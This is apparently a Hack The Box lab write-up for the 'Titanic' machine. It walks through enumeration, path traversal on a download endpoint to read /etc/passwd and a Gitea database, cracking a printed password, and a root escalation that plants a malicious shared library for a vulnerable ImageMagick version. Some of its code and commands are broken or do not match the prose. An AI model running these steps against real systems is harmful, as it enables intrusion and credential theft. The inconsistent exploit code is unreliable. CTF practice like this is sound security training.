@@ -1,0 +1,205 @@
+---
+title: Titanic
+date: '2025-02-16'
+description: ''
+type: writeup
+platform: hackthebox
+tags:
+  - ACTIVE MACHINE
+  - CTF
+  - Easy
+  - HTB
+cover: /mc/uploads/2025/02/RMS_Titanic_3.jpg
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this walkthrough, we'll explore the exploitation of the "Titanic" machine on Hack The Box, categorized as an easy-level challenge. We'll cover the steps from initial enumeration to privilege escalation, providing detailed explanations to enhance understanding.
+
+## Enumeration with Nmap
+
+We begin by scanning the target machine (`10.10.11.55`) using Nmap to identify open ports and services:
+
+```bash
+$ nmap -sV  10.10.11.55 -T5
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 00:28 +01
+Nmap scan report for titanic.htb (10.10.11.55)
+Host is up (0.11s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
+```
+The scan reveals two open ports:
+
+- **22/tcp**: OpenSSH 8.9p1
+- **80/tcp**: Apache httpd 2.4.52
+
+These findings indicate that SSH and HTTP services are running on the target.
+
+## Web Directory Enumeration
+
+```bash
+$ gobuster dir -u http://titanic.htb/ -w ~/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+
+/download             (Status: 400) [Size: 41]
+/book                 (Status: 405) [Size: 153]
+/server-status        (Status: 403) [Size: 276]
+
+```
+so we found interisting endpoint "/download" so we gonna interact with it with curl or with the browser
+
+```bash
+$curl "http://titanic.htb/download"                                                         
+{"error":"Ticket parameter is required"}
+```
+This response suggests that the `ticket` parameter is necessary. Testing with an arbitrary value:
+
+```bash
+$curl "http://titanic.htb/download?ticket=x"
+{"error":"Ticket not found"}
+```
+The error indicates that the application is attempting to retrieve a file based on the `ticket` parameter, hinting at a potential Local File Inclusion (LFI) vulnerability.
+
+using my baby script for LFI [Local File Inclusion](https://nutzh.top/payload/local-file-inclusion/)
+
+```bash
+./exploit.sh   
+[+] Testing with download?ticket=../etc/passwd
+        Status code --> 404
+[+] Testing with download?ticket=../../etc/passwd
+        Status code --> 404
+[+] Testing with download?ticket=../../../etc/passwd
+        Status code --> 200
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false
+```
+With LFI confirmed, we attempt to access the user flag:
+
+```bash
+./exploit.sh                               
+[+] Testing with download?ticket=../home/developer/user.txt
+        Status code --> 404
+[+] Testing with download?ticket=../../home/developer/user.txt
+        Status code --> 404
+[+] Testing with download?ticket=../../../home/developer/user.txt
+        Status code --> 200
+0a494ae24651ea98f495152720c12da2
+```
+and Yes my little Baby never failed to find something   
+This returns the user flag, indicating read access to sensitive files.
+
+## subdomains
+
+While exploring the web server, we perform virtual host enumeration to discover subdomains:
+
+```bash
+$ gobuster vhost -u http://titanic.htb -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain| grep "Status: 200"
+Found: dev.titanic.htb Status: 200 [Size: 13982]
+```
+The scan reveals `dev.titanic.htb`. Adding this to our `/etc/hosts` file allows us to access the subdomain, which hosts a Gitea instance—a self-hosted Git service.
+
+[![](https://nutzh.top/wp-content/uploads/2025/02/images.png)](https://nutzh.top/wp-content/uploads/2025/02/images.png)## Foothold
+
+so i googled to find the path to the database we got it after many tries
+
+```bash
+$curl "http://titanic.htb/downloadticket=../../../../../../../../../../home/developer/gitea/data/gitea/gitea.db" --output gitea.db
+```
+and we got a database now we need to look for password and the users with the sqlitebrowser or using a tool i found it in Github   
+and we gonna adjust it a little so he can just grep the Hash of the "developer" and use hashcat at the same time.
+
+```bash
+python3 grea.py gitea.db /usr/share/wordlists/rockyou.txt
+sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
+
+[!] Firing up Hashcat...
+
+[+] CRACKED: 25282528
+```
+Armed with the `developer` credentials, we establish an SSH connection:
+
+## Privelage escalation 
+
+On the machine, we find a script `/opt/scripts/identify_images.sh` that utilizes ImageMagick's `identify` command:
+
+```bash
+developer@titanic:/opt/scripts$ cat identify_images.sh 
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+```
+
+```bash
+developer@titanic:/opt/scripts$ magick --version
+Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713
+```
+This specific version is known to be vulnerable to arbitrary code execution due to improper handling of the `LD_LIBRARY_PATH` environment variable. The vulnerability arises when ImageMagick includes an empty path in `LD_LIBRARY_PATH`, allowing it to load malicious shared libraries from the current working directory.. And we found this Github repo 
+
+With this payload we'll compile a shared library that executes a command to read the root flag and store its contents in a temporary file.
+
+```bash
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - 
+#include 
+#include 
+
+__attribute__((constructor)) void init(){
+    system("id");
+    exit(0);
+}
+EOF
+```
+This code defines a constructor function that runs immediately upon loading the library, executing the `cat` command to read the root flag and redirecting the output to `/tmp/nutzh.txt`.
+
+To exploit the vulnerability, we need ImageMagick to process an image file in the current directory. We'll copy an existing JPEG image to a new file to initiate this process.
+
+```bash
+cp .jpg nutzh.jpg
+```
+When the `identify_images.sh` script runs, it will process `nutzh.jpg`. Due to the vulnerability, ImageMagick will include the current directory in its `LD_LIBRARY_PATH`, loading our malicious `libxcb.so.1` library and executing the embedded command.  
+After the script executes, we can access the root flag from the temporary file.
+
+```bash
+cat /tmp/nutzh  
+953f514dXXXXXXXXXXXXXXXXX
+```
+**GG**
